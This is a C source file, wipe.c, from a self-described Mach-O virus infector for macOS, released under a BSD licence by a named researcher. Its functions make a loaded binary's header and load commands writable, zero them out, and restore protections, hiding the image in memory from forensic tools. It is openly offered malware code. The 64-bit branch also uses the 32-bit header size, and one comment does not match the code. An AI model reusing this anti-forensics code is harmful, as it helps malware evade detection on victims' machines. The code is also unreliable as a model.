/*
 *        (`-.           _  .-')                .-')   ,---. 
 *     _(OO  )_        ( \( -O )              ( OO ). |   | 
 * ,--(_/   ,. \ ,-.-') ,------. ,--. ,--.   (_)---\_)|   | 
 * \   \   /(__/ |  |OO)|   /`. '|  | |  |   /    _ | |   | 
 *  \   \ /   /  |  |  \|  /  | ||  | | .-') \  :` `. |   | 
 *   \   '   /,  |  |(_/|  |_.' ||  |_|( OO ) '..`''.)|  .' 
 *    \     /__),|  |_.'|  .  '.'|  | | `-' /.-._)   \`--'  
 *     \   /   (_|  |   |  |\  \('  '-'(_.-' \       /.--.  
 *      `-'      `--'   `--' '--' `-----'     `-----' '--'  
 *
 * A mach-o virus infector
 *
 * Copyright (c) fG!, 2012,2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * wipe.c
 *
 * Wipe headers
 *
 */

#include "wipe.h"
#include <stdio.h>
#include <stdlib.h>
#include <mach-o/loader.h>
#include <mach/mach_vm.h>
#include <mach/mach.h>

static uint8_t clean_bytes(uint8_t *startAddress, uint32_t size);

uint8_t
wipe_header(uint8_t *imageAddress)
{    
#if DEBUG
    printf("***** [%s] start *****\n", __FUNCTION__);
#endif
    struct mach_header *mh = (struct mach_header*)imageAddress;
    uint32_t headerSize = 0;
    
    if (mh->magic == MH_MAGIC) headerSize = sizeof(struct mach_header);
    else if (mh->magic == MH_MAGIC_64) headerSize = sizeof(struct mach_header);
    else return 1;
    
    clean_bytes(imageAddress, headerSize + mh->sizeofcmds);
    return 0;
}

static uint8_t
clean_bytes(uint8_t *startAddress, uint32_t size)
{
    // XXX: add error checking
    // change protections, copy the decrypted bytes, and restore protections
    mach_vm_protect(mach_task_self(), (mach_vm_address_t)startAddress, (mach_vm_size_t)size, FALSE, VM_PROT_ALL);
    memset(startAddress, 0, size);
    mach_vm_protect(mach_task_self(), (mach_vm_address_t)startAddress, (mach_vm_size_t)size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
    return 0;
}
